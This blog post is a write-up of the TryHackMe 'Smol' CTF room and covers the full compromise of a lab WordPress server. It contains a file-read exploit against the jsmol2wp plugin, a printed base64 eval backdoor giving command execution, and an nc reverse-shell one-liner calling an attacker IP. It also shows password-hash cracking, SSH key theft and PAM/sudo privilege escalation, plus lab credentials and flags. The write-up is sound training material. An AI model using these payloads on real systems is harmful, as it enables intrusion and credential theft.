---
title: "TryHackMe - Smol"
date: 2025-02-20 22:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [wordPress, exploits, privilege escalation, reverse shell]

---


# SMOL

## 1. Initial Scanning

First, I start with an nmap scan and adding adress to `/etc/hosts`:

```sh
 nmap -T4 -n -sC -SV -Pn -p- IP
 sudo nano /etc/hosts
```

## 2. Using WPScan

I detect that the site is running WordPress, so I run `wpscan`:

```sh
 wpscan --url http://www.smol.thm/
```

I find a vulnerable plugin: **jsmol2wp v1.07**.

## 3. Exploiting the Vulnerable Plugin

After searching for exploits, I find a vulnerability that allows reading the `wp-config.php` file:
https://vulners.com/wpexploit/WPEX-ID:AD01DAD9-12FF-404F-8718-9EBBD67BF611

```sh
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

Database credentials found:

```sh
DB_USER: wpuser
DB_PASSWORD: kbLSF2Vop#lw3rjDZ629*Z%G
```

## 4. Accessing WordPress Admin Panel

Using the retrieved credentials, I log into:

```sh
http://smol.thm/wp-login.php
```

Inside the dashboard, I find **Webmaster Tasks**, specifically:

```
[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
```

Using the previous exploit, I retrieve the source of the **Hello Dolly** plugin:

```sh
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

I find a backdoor:

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

Decoding in CyberChef reveals:

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

This allows Remote Code Execution (RCE).

## 5. Obtaining a Reverse Shell

Since the application is vulnerable to RCE via `cmd`, I generate a reverse shell at:

```sh
www.revshells.com
```

I select **nc mkfifo** and obtain:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.21.77 443 >/tmp/f
```

I URL encode this using CyberChef:

```sh
rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f%7Csh%20-i%202%3E&1%7Cnc%2010.8.21.77%20443%20%3E/tmp/f
```

Setting up a listener:

```sh
nc -lvnp 443
```

Triggering the payload:

```sh
http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.8.21.77%20443%20%3E%2Ftmp%2Ff
```

Shell obtained!

I set the `TERM` environment variable to `xterm` to inform the system that I am using an `xterm` terminal:

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```



## 6. Database Access & Extracting Hashes

Using the credentials found earlier:

```sh
mysql -u wpuser -p kbLSF2Vop#lw3rjDZ629*Z%G
```

Listing databases:

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT * FROM wp_users;
```

Extracted password hashes:

```
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
wpsuer:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```

Cracking hashes with `john`:

```sh
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password for **diego**: `sandiegocalifornia`

Logging in:

```sh
su diego
```

Finding first flag:

```sh
cat user.txt
45edaec653ff9ee06236b7ce72b86963
```

## 7. SSH Private Key Discovery

Searching user directories, I find **think's SSH private key**:

```sh
ls -la /home/think/.ssh
cat /home/think/.ssh/id_rsa
```

Using the key to log in:

```sh
ssh -i id_rsa think@127.0.0.1
```

## 8. Privilege Escalation via PAM Misconfiguration

Checking `/etc/pam.d/su`, I find:

```sh
auth sufficient pam_succeed_if.so use_uid user = think
```

This allows me to switch to **gege** without a password:

```sh
su gege
```

Finding `wordpress.old.zip`, I transfer it:

```sh
python3 -m http.server 8080
wget http://smol.thm:8080/wordpress.old.zip
```

Using `zip2john`:

```sh
zip2john wordpress.old.zip > hashes
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracking reveals **xavi’s** database credentials:

```
DB_USER: xavi
DB_PASSWORD: P@ssw0rdxavi@
```

Logging in:

```sh
su xavi
```

## 9. Root Privileges

Checking sudo permissions:

```sh
sudo -l
```

Xavi has full sudo access, so I escalate to `root`:

```sh
sudo su -
```

Final flag found:

```sh
cat root.txt
bf89ea3ea01992353aef1f576214d4e4
```

## Conclusion

This CTF involved multiple vulnerabilities: an outdated WordPress plugin, a backdoor, weak password hashes, and a PAM misconfiguration. Combining these allowed full system compromise.
